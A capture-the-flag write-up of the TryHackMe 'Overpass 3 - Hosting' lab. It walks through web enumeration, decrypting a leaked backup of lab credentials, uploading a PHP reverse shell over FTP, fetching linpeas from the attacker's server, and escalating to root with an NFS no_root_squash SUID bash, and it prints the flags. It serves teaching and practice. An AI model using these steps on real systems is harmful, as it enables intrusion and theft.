# Overpass 3 - Hosting

## Description

You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.

# Initial Scan

Let's start with an Nmap scan. The scan reveals three open ports:
* 21 ftp
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
~~~

# Web Flag

## Enumeration

Let's start with the webpage since we don't have creds to log into FTP or SSH services. First I ran `gobuster` and found `/backups` directory:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Overpass3-Hosting]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/ -x zip,txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.7.25/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,zip
[+] Timeout:                 10s
===============================================================
2021/10/19 10:28:27 Starting gobuster in directory enumeration mode
===============================================================
/backups              (Status: 301) [Size: 236] [--> http://10.10.7.25/backups/]
~~~

## Backup File

This directory contained a zip file called `backup.zip`. I downlaoded the file and extracted the files inside it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Overpass3-Hosting/files]
└─$ wget http://$IP:80/backups/backup.zip
--2021-10-19 10:32:27--  http://10.10.7.25/backups/backup.zip
Connecting to 10.10.7.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13353 (13K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                    100%[===============================================>]  13.04K  --.-KB/s    in 0.1s    

2021-10-19 10:32:27 (110 KB/s) - ‘backup.zip’ saved [13353/13353]

                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Overpass3-Hosting/files]
└─$ unzip backup.zip 
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key
~~~

The zip file extracted into 2 files. A gpg encrypted xlsx (Excel spreadsheet) file (`CustomerDetails.xlsx.gpg`) and a pgp private key (`priv.key`).

We can use the key to decrypt the gpg file. The steps are as follows: (always wanted to say that. XD)

~~~
$ gpg --import priv.key                 
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
                                                                                                                      
$ gpg --decrypt-file CustomerDetails.xlsx.gpg
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
~~~

After decrypting the file, we can read the content of the xlsx file which is the following table:

|    Customer Name    |      Username       |      Password       | Credit card number  | CVC |
| :-----------------: | :-----------------: | :-----------------: | :-----------------: | :-: |
|    Par. A. Doxx     |      paradox        |  ShibesAreGreat123  | 4111 1111 4555 1142 | 432 |
|   0day Montgomery   |        0day         |  OllieIsTheBestDog  | 5555 3412 4444 1115 | 642 |
|      Muir Land      |   muirlandoracle    |  A11D0gsAreAw3s0me  | 5103 2219 1119 9245 | 737 |

We can try to login into different servives with the usernames and passwords.

## FTP

I used paradox's creds (`pradox:ShibesAreGreat123`) and logged into FTP service:

~~~
$ ftp $IP
Connected to 10.10.7.25.
220 (vsFTPd 3.0.3)
Name (10.10.7.25:user): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
~~~

As you can see, these are the website's sources and this directory is writable which means we can upload a reverse shell and call it from the webpage. Let's upload the good old [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). (Don't forget to change the IP to yours.):

~~~
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (84.4771 MB/s)
~~~

## Reverse Shell

Now we can start a listener and call the shell:

Listener:
~~~
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
~~~

Call the shell from:
~~~
$ curl -s "http://$IP/shell.php"
~~~

Now we have a shell:
~~~
sh-4.4$ id
uid=48(apache) gid=48(apache) groups=48(apache)
~~~

## Web Flag

Now we can start looking for the flags. To make things faster I used `find` command and found the we flag in `/usr/share/httpd/web.flag`:

~~~
sh-4.4$ find / -type f -name "*flag*" 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/vif-0/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/bin/pflags
/usr/sbin/grub2-set-bootflag
/usr/share/man/man1/grub2-set-bootflag.1.gz
/usr/share/httpd/web.flag
sh-4.4$ cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
~~~

Web flag: `thm{0ae72f7870c3687129f7a824194be09d}`

# User Flag

## Switching to paradox

Now let's switch to user `pradox` and then we can add our SSH public key to `/home/paradox/.ssh/authorized_keys` to connect via SSH to get a proper shell:

~~~
sh-4.4$ su paradox
Password: ShibesAreGreat123
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
~~~

Now create your public key using `ssh-keygen` (choose a simple password) and add the content of the file with `.pub` extention to `/home/paradox/.ssh/authorized_keys` and then copy the key to your machine and set its permission to 600 and now you can login via SSH:

~~~
$ ssh -i mykey paradox@$IP
The authenticity of host '10.10.7.25 (10.10.7.25)' can't be established.
ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.7.25' (ECDSA) to the list of known hosts.
Enter passphrase for key 'mykey': 
Last login: Wed Oct 20 10:53:26 2021
[paradox@localhost ~]$ id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
~~~

## NFS Service

I ran `sudo -l` to check my permissions and I have none:
~~~
[paradox@localhost ~]$ sudo -l
[sudo] password for paradox: 
Sorry, user paradox may not run sudo on localhost.
~~~

Let's upload [`linpeas`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to find the useful files for privesc. Use a python server and `curl` on the target machine since `wget` binary doesn't exist and then set its permission to be executable and then run it:

Your machine:
~~~
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Target machine:
~~~
[paradox@localhost ~]$ curl http://<YOUR IP>/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  465k  100  465k    0     0   220k      0  0:00:02  0:00:02 --:--:--  220k
[paradox@localhost ~]$ chmod +x linpeas.sh
[paradox@localhost ~]$ ./linpeas.sh
~~~

The result reveals something interesting:
~~~
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
~~~

There is an NFS share (/home/james), with the `no_root_squash` option set. We will use this later for privesc but for now we'll use the NFS share. We can confirm that the NFS share is on port 2049:

~~~
[paradox@localhost ~]$ rpcinfo -p | grep nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
~~~

We can't just mount the share because it is only accessible to localhost. We can solve this using the following command:

~~~
$ ssh -fN -L "2049:$IP:2049" -i mykey paradox@$IP                                                      
Enter passphrase for key 'mykey':
~~~

We can confirm our access using Nmap:
~~~
$ nmap localhost -p2049
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 06:14 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000079s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
2049/tcp open  nfs
~~~

As you can see it is open to us.

## User Flag

Now let's mount the share and read the user flag:
~~~
$ mkdir nfs         
                                                                                                                      
$ sudo mount -t nfs 127.0.0.1: nfs               
[sudo] password for user: 
                                                                                                                      
$ cd nfs                        
                                                                                                                      
$ ls -la
total 20
drwx------ 3 user user  112 Nov 17  2020 .
drwxr-xr-x 3 user user 4096 Oct 20 06:16 ..
lrwxrwxrwx 1 root root    9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r-- 1 user user   18 Nov  8  2019 .bash_logout
-rw-r--r-- 1 user user  141 Nov  8  2019 .bash_profile
-rw-r--r-- 1 user user  312 Nov  8  2019 .bashrc
drwx------ 2 user user   61 Nov  7  2020 .ssh
-rw------- 1 user user   38 Nov 17  2020 user.flag
                                                                                                                      
$ cat user.flag   
thm{3693fc86661faa21f16ac9508a43e1ae}
~~~

User flag: `thm{3693fc86661faa21f16ac9508a43e1ae}`

# Root Flag

Now we need to gain root access, in order to obtain the root flag. First, add your `id_rsa.pub` to `authorized_keys` and then connect to SSH as `james`:

In the nfs mounted directory:
~~~
$ cp ~/.ssh/id_rsa.pub .ssh/authorized_keys
~~~

~~~
$ ssh james@$IP        
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$
~~~

## Privilege Escalation

Now we can use what we have found earlier in linpeas result:
~~~
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
~~~

* Note: For this part I used the explanation from [this](https://www.aldeid.com/wiki/TryHackMe-Overpass-3-Hosting) article.

Let's see how we are going to use this option:

By default, NFS shares change the root user to the `nfsnobody` user, an unprivileged user account. In this way, all root-created files are owned by `nfsnobody`, which prevents uploading of programs with the setuid bit set. However, if the `no_root_squash is used` option is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute.

Let's copy the bash binary to `james`'s home directory:

~~~
[james@localhost ~]$ cp /usr/bin/bash /home/james/
~~~

Then I abused the NFS permissions to change the owner and to set the SUID bit on my machine in the nfs share:

In the mounted directory:
~~~
$ sudo chown root:root bash
[sudo] password for user: 
                                                                                                                      
$ sudo chmod +s bash
~~~

Now if go back to the target machine, we can see the `bash` binary is owned by `root` with SUID bit set:

~~~
rwsr-sr-x  1 root  root  1219248 Oct 20 11:54 bash
-rw-------. 1 james james      38 Nov 17  2020 user.flag
~~~

## Root Flag

So we simply run `./bash -p` and we are root and we can read the root flag in `/root`:

~~~
[james@localhost ~]$ ./bash -p
bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)
bash-4.4# cd /root
bash-4.4# cat root.flag
thm{a4f6adb70371a4bceb32988417456c44}
~~~

Root flag: `thm{a4f6adb70371a4bceb32988417456c44}`


# D0N3! ; )

Thanks to the creators and the explaination of the ariticle!

Hope you learned something!

Have a good one! : )